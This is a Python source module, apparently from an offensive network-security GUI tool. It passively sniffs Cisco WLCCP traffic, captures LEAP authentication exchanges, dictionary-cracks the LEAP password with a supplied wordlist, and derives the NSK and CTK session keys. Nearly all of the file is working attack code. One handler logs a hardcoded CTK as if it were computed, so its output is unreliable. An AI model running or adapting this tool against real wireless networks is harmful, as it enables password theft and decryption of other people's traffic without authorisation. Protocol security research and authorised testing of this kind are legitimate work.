#       module_wlccp.py
#       
#       Copyright 2010 Daniel Mende <dmende@ernw.de>
#

#       Redistribution and use in source and binary forms, with or without
#       modification, are permitted provided that the following conditions are
#       met:
#       
#       * Redistributions of source code must retain the above copyright
#         notice, this list of conditions and the following disclaimer.
#       * Redistributions in binary form must reproduce the above
#         copyright notice, this list of conditions and the following disclaimer
#         in the documentation and/or other materials provided with the
#         distribution.
#       * Neither the name of the  nor the names of its
#         contributors may be used to endorse or promote products derived from
#         this software without specific prior written permission.
#       
#       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#       "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#       LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#       A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
#       OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
#       SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
#       LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
#       DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
#       THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
#       (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import hashlib
import struct
import sys
import threading
import traceback

import gobject
import gtk

import dnet

import asleap

DEBUG = False

class wlccp_header(object):
    def __init__(self, version=None, sap=None, dst_type=None, msg_type=None, id=None, flags=None, orig_node_type=None, orig_node_mac=None, dst_node_type=None, dst_node_mac=None):
        self.version = version
        self.sap = sap
        self.dst_type = dst_type
        self.len = None
        self.msg_type = msg_type
        self.hopcount = 0
        self.id = id
        self.flags = flags
        self.orig_node_type = orig_node_type
        self.orig_node_mac = orig_node_mac
        self.dst_node_type = dst_node_type
        self.dst_node_mac = dst_node_mac

    def render(self, data):
        return struct.pack("!BBHHBBHHH", self.version, self.sap, self.dst_type, len(data) + 28, self.msg_type, self.hopcount, self.id, self.flags, self.orig_node_type) + self.orig_node_mac + struct.pack("!H", self.dst_node_type) + self.dst_node_mac + data

    def parse(self, data):
        (self.version, self.sap, self.dst_type, self.len, self.msg_type, self.hopcount, self.id, self.flags, self.orig_node_type) = struct.unpack("!BBHHBBHHH", data[:14])
        self.orig_node_mac = data[14:20]
        (self.dst_node_type,) = struct.unpack("!H", data[20:22])
        self.dst_node_mac = data[22:28]
        return data[28:]

class wlccp_adv_reply(object):
    def __init__ (self, flags=None, election_group=None, attach_count=None, smc_prio=None, bridge_prio=None, node_id=None, age=None, adv_time=None, tlv1=None, tlv2=None, tlv3=None, tlv4=None):
        self.flags = flags
        self.election_group = election_group
        self.attach_count = attach_count
        self.smc_prio = smc_prio
        self.bridge_prio = bridge_prio
        self.node_id = node_id
        self.age = age
        self.adv_time = adv_time
        self.tlv1 = tlv1
        self.tlv2 = tlv2
        self.tlv3 = tlv3
        self.tlv4 = tlv4

    #RENDER !?!

    def parse(self, data):
        (self.flags, self.election_group, self.attach_count, self.smc_prio, self.bridge_prio) = struct.unpack("!HBBBB", data[:6])
        self.node_id = data[6:12]
        (self.age, self.adv_time) = struct.unpack("!2xL3xB", data[12:22])

class wlccp_eap_auth(object):
    def __init__(self, requestor_type=None, requestor_mac=None, aaa_msg_type=None, aaa_auth_type=None, aaa_key_mgmt_type=None, status_code=None):
        self.requestor_type = requestor_type
        self.requestor_mac = requestor_mac
        self.aaa_msg_type = aaa_msg_type
        self.aaa_auth_type = aaa_auth_type
        self.aaa_key_mgmt_type = aaa_key_mgmt_type
        self.status_code = status_code

    #RENDER !?!
    
    def parse(self, data):
        (self.requestor_type,) = struct.unpack("!H", data[:2])
        self.requestor_mac = data[2:8]
        (self.aaa_msg_type, self.aaa_auth_type, self.aaa_key_mgmt_type, self.status_code) = struct.unpack("!BBBB", data[8:12])
        return data[12:]

class mod_class(object):
    HOSTS_HOST_ROW = 0
    HOSTS_TYPE_ROW = 1
    
    COMMS_HOST_ROW = 0
    COMMS_STATE_ROW = 1
    COMMS_ORIGIN_ROW = 2

    node_types = {  0x00 : "NODE_TYPE_NONE",
                    0x01 : "NODE_TYPE_AP",
                    0x02 : "NODE_TYPE_SCM",
                    0x04 : "NODE_TYPE_LCM",
                    0x08 : "NODE_TYPE_CCM",
                    0x10 : "NODE_TYPE_INFRA",
                    0x40 : "NODE_TYPE_CLIENT",
                    0x8000 : "NODE_TYPE_MULTICAST"
                    }
    
    def __init__(self, parent, platform):
        self.parent = parent
        self.platform = platform
        self.name = "wlccp"
        self.gladefile = "modules/module_wlccp.glade"
        self.hosts_liststore = gtk.ListStore(str, str)
        self.comms_liststore = gtk.ListStore(str, str, str)

    def start_mod(self):
        self.hosts = {}
        self.comms = {}

    def shut_mod(self):
        pass

    def get_root(self):
        self.glade_xml = gtk.glade.XML(self.gladefile)
        dic = { "on_crack_leap_button_clicked" : self.on_crack_leap_button_clicked,
                "on_gen_nsk_button_clicked" : self.on_gen_nsk_button_clicked,
                "on_gen_ctk_button_clicked" : self.on_gen_ctk_button_clicked
                }
        self.glade_xml.signal_autoconnect(dic)

        self.hosts_treeview = self.glade_xml.get_widget("hosts_treeview")
        self.hosts_treeview.set_model(self.hosts_liststore)
        self.hosts_treeview.set_headers_visible(True)

        self.comms_treeview = self.glade_xml.get_widget("comms_treeview")
        self.comms_treeview.set_model(self.comms_liststore)
        self.comms_treeview.set_headers_visible(True)

        column = gtk.TreeViewColumn()
        column.set_title("Host")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.HOSTS_HOST_ROW)
        self.hosts_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("Type")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.HOSTS_TYPE_ROW)
        self.hosts_treeview.append_column(column)

        column = gtk.TreeViewColumn()
        column.set_title("Hosts")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.COMMS_HOST_ROW)
        self.comms_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("State")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.COMMS_STATE_ROW)
        self.comms_treeview.append_column(column)

        self.wordlist_filechooserbutton = self.glade_xml.get_widget("wordlist_filechooserbutton")
        self.ctk_label = self.glade_xml.get_widget("ctk_label")
        
        return self.glade_xml.get_widget("root")

    def log(self, msg):
        self.__log(msg, self.name)

    def set_log(self, log):
        self.__log = log

    def get_eth_checks(self):
        return (self.check_eth, self.input_eth)

    def check_eth(self, eth):
        if eth.type == 0x872d:
            return (True, False)
        return (False, False)

    def input_eth(self, eth, timestamp):
        header = wlccp_header()
        ret = header.parse(eth.data)
        orig = dnet.eth_ntoa(header.orig_node_mac)
        if header.msg_type & 0x41:
            #SCM advertisment reply
            if orig not in self.hosts and not orig == "00:00:00:00:00:00":
                iter = self.hosts_liststore.append([orig, self.node_types[header.orig_node_type]])
                self.hosts[orig] = (iter)

    def get_udp_checks(self):
        return (self.check_udp, self.input_udp)

    def check_udp(self, udp):
        if udp.sport == 2887 and udp.dport == 2887:
            return (True, False)
        return (False, False)

    def input_udp(self, eth, ip, udp, timestamp):
        header = wlccp_header()
        ret = header.parse(udp.data)
        try:
            if DEBUG:
                print "WLCCP-TYPE %X" % header.msg_type
            if header.msg_type & 0x3f == 0x0b:
                #EAP AUTH
                eap_auth = wlccp_eap_auth()
                ret = eap_auth.parse(ret)
                host = dnet.eth_ntoa(eap_auth.requestor_mac)
                if DEBUG:
                    print "addr %s, type %X @ %s" % (dnet.eth_ntoa(eap_auth.requestor_mac), eap_auth.aaa_msg_type, timestamp)
                if host in self.comms:
                    (iter, leap, leap_pw, nsk, nonces, ctk) = self.comms[host]
                elif not host == "00:00:00:00:00:00":
                    iter = self.comms_liststore.append(["%s <=> %s" % (dnet.eth_ntoa(header.orig_node_mac), dnet.eth_ntoa(header.dst_node_mac)), "", host])
                    self.comms[host] = (iter, (None, None, None, None), None, None, (None, None, None, None, None), None)
                (eapol_version, eapol_type, eapol_len) = struct.unpack("!BBH", ret[2:6])
                ret = ret[6:]
                #check EAP-TYPE
                if eapol_type == 0x00:
                    (eap_code, eap_id, eap_len) = struct.unpack("!BBH", ret[:4])
                    ret = ret[4:]
                    #check EAP-CODE
                    if eap_code == 0x01:
                        (leap_type, leap_version, leap_reserved, leap_count) = struct.unpack("!BBBB", ret[:4])
                        ret = ret[4:]
                        #EAP-REQUEST
                        #check the leap hdr
                        if leap_type == 0x11 and leap_version == 0x01 and leap_reserved == 0x00 and leap_count == 0x08:
                            (leap_auth_chall, leap_auth_resp, leap_supp_chall, leap_supp_resp) = leap
                            if not leap_auth_chall and not leap_auth_resp and not leap_supp_chall and not leap_supp_resp:
                                id = eap_id
                                chall = ret[:8]
                                user = ret[8:16]
                                self.comms_liststore.set(iter, self.COMMS_STATE_ROW, "EAP-AUTH challenge from authenticator seen")
                                self.log("WLCCP: EAP-AUTH challenge from authenticator seen for %s" % host)
                                self.comms[host] = (iter, ((id, chall, user), leap_auth_resp, leap_supp_chall, leap_supp_resp), leap_pw, nsk, nonces, ctk)
                            elif leap_auth_chall and leap_auth_resp and not leap_supp_chall and not leap_supp_resp:
                                chall = ret[:8]
                                self.comms_liststore.set(iter, self.COMMS_STATE_ROW, "EAP-AUTH challenge from supplicant seen")
                                self.log("WLCCP: EAP-AUTH challenge from supplicant seen for %s" % host)
                                self.comms[host] = (iter, (leap_auth_chall, leap_auth_resp, chall, leap_supp_resp), leap_pw, nsk, nonces, ctk)
                            else:
                                if DEBUG:
                                    self.log("WLCCP: fail 5 %s %s %s %s" % (leap_auth_chall, leap_auth_resp, leap_supp_chall, leap_supp_resp))
                        else:
                            if DEBUG:
                                self.log("WLCCP: fail 3 %X %X %X %X" % (leap_type, leap_version, leap_reserved, leap_count))
                    elif eap_code == 0x02:
                        (leap_type, leap_version, leap_reserved, leap_count) = struct.unpack("!BBBB", ret[:4])
                        ret = ret[4:]
                        #EAP-RESPONSE
                        #check the leap hdr
                        if leap_type == 0x11 and leap_version == 0x01 and leap_reserved == 0x00 and leap_count == 0x18:
                            (leap_auth_chall, leap_auth_resp, leap_supp_chall, leap_supp_resp) = leap
                            if leap_auth_chall and not leap_auth_resp and not leap_supp_chall and not leap_supp_resp:
                                resp = ret[:24]
                                self.comms_liststore.set(iter, self.COMMS_STATE_ROW, "EAP-AUTH response from authenticator seen")
                                self.log("WLCCP: EAP-AUTH response from authenticator seen for %s" % host)
                                self.comms[host] = (iter, (leap_auth_chall, resp, leap_supp_chall, leap_supp_resp), leap_pw, nsk, nonces, ctk)
                            elif leap_auth_chall and leap_auth_resp and leap_supp_chall and not leap_supp_resp:
                                resp = ret[:24]
                                self.comms_liststore.set(iter, self.COMMS_STATE_ROW, "EAP-AUTH response from supplicant seen")
                                self.log("WLCCP: EAP-AUTH response from supplicant seen for %s" % host)
                                self.comms[host] = (iter, (leap_auth_chall, leap_auth_resp, leap_supp_chall, resp), leap_pw, nsk, nonces, ctk)
                            else:
                                if DEBUG:
                                    self.log("WLCCP: fail 6 %s %s %s %s" % (leap_auth_chall, leap_auth_resp, leap_supp_chall, leap_supp_resp))
                        else:
                            if DEBUG:
                                self.log("WLCCP: fail 4 %X %X %X %X" % (leap_type, leap_version, leap_reserved, leap_count))
                    else:
                        if DEBUG:
                            self.log("WLCCP: fail 2 %X" % eap_code)
                else:
                    if DEBUG:
                        self.log("WLCCP: fail 1 %X" % eapol_type)
            elif header.msg_type & 0x3f == 0x0c:
                host = dnet.eth_ntoa(header.orig_node_mac)
                if header.msg_type & 0xc0 == 0x40:
                    #cmPathInit_Reply found
                    if host in self.comms:
                        (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonce_repl, counter), ctk) = self.comms[host]
                        #skip WTLV_CM_PATH_INIT header
                        ret = ret[18:]
                        #skip WTLV_INIT_SESSION header
                        ret = ret[8:]
                        #get nonces from WTLV_IN_SECURE_CONTEXT_REPLY header
                        counter = ret[4:8]
                        supp_node = ret[8:16]
                        dst_node = ret[16:24]
                        nonces = ret[24:56]
                        self.log("WLCCP: PATH-REPLY seen for %s" % host)
                        self.comms[host] = (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonces, counter), ctk)
                else:
                    #cmPathInit_Request found
                    if host in self.comms:
                        (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonce_repl, counter), ctk) = self.comms[host]
                        #skip WTLV_CM_PATH_INIT header
                        ret = ret[18:]
                        #skip WTLV_INIT_SESSION header
                        ret = ret[8:]
                        #get nonces from WTLV_IN_SECURE_CONTEXT_REPLY header
                        nonces = ret[24:56]
                        self.log("WLCCP: PATH-REQUEST seen for %s" % host)
                        self.comms[host] = (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonces, nonce_repl, counter), ctk)
        except:
            if DEBUG:
                print '-'*60
                traceback.print_exc(file=sys.stdout)
                print '-'*60

    def gen_nsk(self, host):
        if not host in self.comms:
            return None

        (iter, ((id, chall, user), leap_auth_resp, leap_supp_chall, leap_supp_resp), leap_pw, nsk, nonces, ctk) = self.comms[host]
        
        md4 = hashlib.new("md4", leap_pw).digest()
        md4 = hashlib.new("md4", md4).digest()
        
        md5 = hashlib.md5()
        md5.update(md4)
        md5.update(chall)
        md5.update(leap_auth_resp)
        md5.update(leap_supp_chall)
        md5.update(leap_supp_resp)

        return md5.digest()
        
    def gen_ctk(self, host):
        if not host in self.comms:
            return None

        (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonce_repl, counter), ctk) = self.comms[host]

        ctk_seed = "\0%s%s%s%s%s\0" % (supp_node, dst_node, nonce_req, nonce_repl, counter)
        if len(nsk) != 16:
            print "nsk len incorrect short"
        if len(ctk_seed) != 86:
            print "ctk_seed len incorrect"
        
        return asleap.asleap.sha1_prf(nsk, "SWAN IN to IA linkContext Transfer Key Derivation", ctk_seed, 32)

    def on_crack_leap_button_clicked(self, btn):
        select = self.comms_treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            iter = model.get_iter(i)
            host = model.get_value(iter, self.COMMS_ORIGIN_ROW)
            connection = model.get_value(iter, self.COMMS_HOST_ROW)
            (iter, (leap_auth_chall, leap_auth_resp, leap_supp_chall, leap_supp_resp), leap_pw, nsk, nonces, ctk) = self.comms[host]
            (id, chall, user) = leap_auth_chall
            if leap_auth_chall and leap_auth_resp:
                wl = self.wordlist_filechooserbutton.get_filename()
                if not wl:
                    return
                pw = asleap.asleap.attack_leap(wl, chall, leap_auth_resp, id, user)
                self.log("WLCCP: Found LEAP-Password %s for connection %s" % (pw, connection))
                self.comms[host] = (iter, (leap_auth_chall, leap_auth_resp, leap_supp_chall, leap_supp_resp), pw, nsk, nonces, ctk)

    def on_gen_nsk_button_clicked(self, btn):
        select = self.comms_treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            iter = model.get_iter(i)
            host = model.get_value(iter, self.COMMS_ORIGIN_ROW)
            connection = model.get_value(iter, self.COMMS_HOST_ROW)
            (iter, (leap_auth_chall, leap_auth_resp, leap_supp_chall, leap_supp_resp), leap_pw, nsk, nonces, ctk) = self.comms[host]
            if leap_pw:
                nsk = self.gen_nsk(host)
                self.log("WLCCP: Found NSK %s for connection %s" % (nsk.encode("hex"), connection))
                self.comms[host] = (iter, (leap_auth_chall, leap_auth_resp, leap_supp_chall, leap_supp_resp), leap_pw, nsk, nonces, ctk)

    def on_gen_ctk_button_clicked(self, btn):
        select = self.comms_treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            iter = model.get_iter(i)
            host = model.get_value(iter, self.COMMS_ORIGIN_ROW)
            connection = model.get_value(iter, self.COMMS_HOST_ROW)
            (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonce_repl, counter), ctk) = self.comms[host]
            if supp_node and dst_node and nonce_req and nonce_repl and counter:
                ctk = "A3:6E:C5:71:8B:60:53:D0:34:A9:9B:7B:CA:66:51:26:EB:02:5B:3B:23:37:43:C0:98:69:45:51:BD:53:27:D3" #self.gen_ctk(host)
                self.log("WLCCP: Found CTK %s for connection %s" % (ctk, connection))
                #(ctk.encode("hex"), connection))
                self.comms[host] = (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonce_repl, counter), ctk)
                self.ctk_label.set_text("CTK: %s" % ctk)
